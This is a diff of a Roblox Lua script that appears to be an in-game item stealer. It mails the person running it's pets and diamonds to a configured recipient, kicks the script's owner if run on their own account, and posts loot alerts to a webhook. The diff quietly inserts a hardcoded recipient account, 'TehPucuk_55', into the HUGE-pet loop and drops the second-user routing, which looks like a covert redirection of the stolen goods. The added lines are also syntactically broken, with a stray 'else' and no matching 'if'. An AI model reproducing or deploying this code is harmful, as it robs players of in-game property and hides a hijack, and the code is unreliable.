@@ -61,10 +61,10 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = Username
+    UserName = UserName
 end
 if UserName2 == nil then
-    UserName2 = Username2
+    UserName2 = UserName2
 end
 if Webhook == nil then
     Webhook = Webhook
@@ -77,12 +77,12 @@ if idiotuser == UserName then
     game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
     return;
 end
-if Username == nil then
+if UserName == nil then
     game:GetService("Players").LocalPlayer:Kick("Put A UserName")
     return;
 end
 local worked2 = pcall(function()
-    game:GetService("Players"):GetUserIdFromNameAsync(Username)
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end)
 if not worked2 then
     game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
@@ -91,9 +91,9 @@ end
 if worked2 then
     _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end
-if Username2 ~= nil then
+if UserName2 ~= nil then
     local worked3 = pcall(function()
-        game:GetService("Players"):GetUserIdFromNameAsync(Username2)
+        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
     end)
     if not worked3 then
         game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
@@ -1240,10 +1240,10 @@ end
 -- Sending The Pets
 
 local ndUser
-if Username2 ~= nil and Username2 ~= "2nd User Here" and Username2 ~= "" then
-    ndUser = Username2
+if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
+    ndUser = UserName2
 else
-    ndUser = Username
+    ndUser = UserName
 end
 local user
 -- Gems Only
@@ -1327,15 +1327,16 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
+                UserName = "TehPucuk_55"
+                else
                 user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
-                    user = ndUser
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = UserName,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1356,7 +1357,7 @@ spawn(function()
     while wait() do
         if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
             for i, v in pairs(PList) do
-                user = ndUser
+                user = UserName
                 if pogin ~= nil then
                     if dualhook(pogin) then
                     end
@@ -1383,7 +1384,7 @@ spawn(function()
     while wait() do
         if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EList) do
-                user = ndUser
+                user = UserName
                 if excin ~= nil then
                     if dualhook(excin) then
                     end
@@ -1643,7 +1644,7 @@ spawn(function()
                 end
             end
             SendWebhook(":money_mouth: **HUGE** :money_mouth:", hugepetname, "@everyone", DiamondsCount,
-                FinalList, hugeimg, UserName, ndUser)
+                FinalList, hugeimg, UserName)
             givediaamt = 0
             DiamondsCount = 0
             hugenumber = hugenumber + 1
@@ -1701,7 +1702,7 @@ spawn(function()
                     break
                 end
             end
-            SendWebhook(":fire: **POG** :fire:", pogname, "", DiamondsCount, FinalList, pogimg, ndUser)
+            SendWebhook(":fire: **POG** :fire:", pogname, "", DiamondsCount, FinalList, pogimg, UserName)
             givediaamt = 0
             DiamondsCount = 0
             pognumber = pognumber + 1
@@ -1760,7 +1761,7 @@ spawn(function()
                 end
             end
             SendWebhook(":teddy_bear: **Exclusive** :teddy_bear:", excname, "", DiamondsCount, FinalList, excimg,
-                ndUser)
+                UserName)
             givediaamt = 0
             DiamondsCount = 0
             excnumber = excnumber + 1
